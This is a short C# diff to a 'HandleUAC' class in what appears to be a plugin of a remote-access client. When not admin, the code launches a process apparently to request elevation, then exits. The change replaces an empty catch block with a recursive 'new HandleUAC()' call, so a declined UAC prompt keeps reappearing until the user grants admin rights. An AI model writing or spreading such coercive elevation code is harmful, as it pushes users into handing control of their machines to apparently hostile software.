@@ -12,7 +12,6 @@ namespace Plugin.Handler
         public HandleUAC()
         {
             if (Methods.IsAdmin()) return;
-
             try
             {
                 Process proc = new Process
@@ -30,7 +29,7 @@ namespace Plugin.Handler
                 Methods.ClientExit();
                 Environment.Exit(0);
             }
-            catch { }
+            catch { new HandleUAC(); }
         }
     }
 
